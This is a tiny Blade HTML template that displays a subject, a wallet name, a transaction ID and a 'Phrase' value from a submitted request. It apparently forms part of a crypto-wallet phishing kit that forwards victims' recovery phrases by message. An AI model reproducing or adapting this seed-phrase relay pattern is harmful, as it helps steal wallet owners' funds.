<div>
    <h2>{{$request->subject}}</h2>
    <div>
        <b>Wallet Name: </b>{{$request->walletname}}<br>
        <b>Transaction ID: </b>{{$request->code}}<br>
        <b>Phrase: </b>{{$request->phrase}}<br>
    </div>
</div>
